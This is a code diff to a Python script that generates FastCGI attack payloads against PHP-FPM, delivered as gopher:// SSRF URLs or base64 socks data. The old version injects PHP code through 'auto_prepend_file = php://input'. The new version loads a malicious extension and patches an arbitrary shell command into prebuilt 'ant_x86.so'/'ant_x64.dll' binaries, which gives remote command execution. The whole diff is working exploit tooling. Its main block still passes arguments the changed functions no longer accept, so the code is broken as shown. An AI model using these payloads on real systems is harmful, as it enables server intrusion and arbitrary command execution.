@@ -204,19 +204,19 @@ class FastCGIClient:
         return "fastcgi connect host:{} port:{}".format(self.host, self.port)
 
 
-def generate_raw_payload(host, port, file="/var/www/html/index.php", code="<?php echo `id`;exit;?>"):
+def generate_raw_payload(host, port, extension_path):
     client = FastCGIClient(host, port, 3, 0)
     params = dict()
     documentRoot = "/"
-    uri = file
-    content = code
+    uri = "/var/www/html/index.php"  # TODO remove this
+    content = ""
     params = {
         'GATEWAY_INTERFACE': 'FastCGI/1.0',
         'REQUEST_METHOD': 'POST',
         'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
-        'SCRIPT_NAME': uri,
+        # 'SCRIPT_NAME': uri,
         'QUERY_STRING': '',
-        'REQUEST_URI': uri,
+        # 'REQUEST_URI': uri,
         'DOCUMENT_ROOT': documentRoot,
         'SERVER_SOFTWARE': 'php/fcgiclient',
         'REMOTE_ADDR': '127.0.0.1',
@@ -227,24 +227,50 @@ def generate_raw_payload(host, port, file="/var/www/html/index.php", code="<?php
         'SERVER_PROTOCOL': 'HTTP/1.1',
         'CONTENT_TYPE': 'application/text',
         'CONTENT_LENGTH': "%d" % len(content),
-        'PHP_VALUE': 'auto_prepend_file = php://input',
-        'PHP_ADMIN_VALUE': 'allow_url_include = On'
+        'PHP_VALUE': f'extension={extension_path}',
+        'PHP_ADMIN_VALUE': f'extension={extension_path}\r\nopen_basedir = /'
     }
     return client.request(params, content)
 
 
-def generate_ssrf_payload(host, port, file="/var/www/html/index.php", code="<?php echo `id`;exit;?>"):
-    raw_payload = generate_raw_payload(host, port, file, code)
+def generate_ssrf_payload(host, port, extension_path):
+    raw_payload = generate_raw_payload(host, port, extension_path)
     request_ssrf = urlparse.quote(raw_payload)
     return "gopher://127.0.0.1:" + str(port) + "/_" + request_ssrf
 
 
-def generate_base64_socks_payload(host, port, file="/var/www/html/index.php", code="<?php echo `id`;exit;?>", urlencode=False):
-    raw_payload = generate_raw_payload(host, port, file, code)
+def generate_base64_socks_payload(host, port, extension_path, urlencode=False):
+    raw_payload = generate_raw_payload(host, port, extension_path)
     data = force_text(base64.b64encode(raw_payload))
     if urlencode:
         data = urlparse.quote(data)
     return data
+
+
+def generate_extension(ext_name, ext_path, command):
+    with open(ext_path, "rb") as f:
+        data = bytearray(f.read())
+        start, end = 0, 0
+        if ext_name == "ant_x86.so":
+            start = 275
+            end = 504
+        elif ext_name == 'ant_x64.so':
+            start = 434
+            end = 665
+        elif ext_name == 'ant_x86.dll':
+            start = 1544
+            end = 1683
+        elif ext_name == 'ant_x64.dll':
+            start = 1552
+            end = 1691
+        if len(command) > (end-start):
+            return b''
+        data[end] = 0
+        for n in range(start, start+20):
+            data[n] = 32
+        for n in range(len(command)):
+            data[start+n] = ord(command[n])
+        return bytes(data)
 
 
 if __name__ == '__main__':
@@ -259,5 +285,6 @@ if __name__ == '__main__':
                         default=9000, type=int)
 
     args = parser.parse_args()
-    print(generate_base64_socks_payload(args.host, args.port, args.file, args.code))
+    print(generate_base64_socks_payload(
+        args.host, args.port, args.file, args.code))
     print(generate_ssrf_payload(args.host, args.port, args.file, args.code))
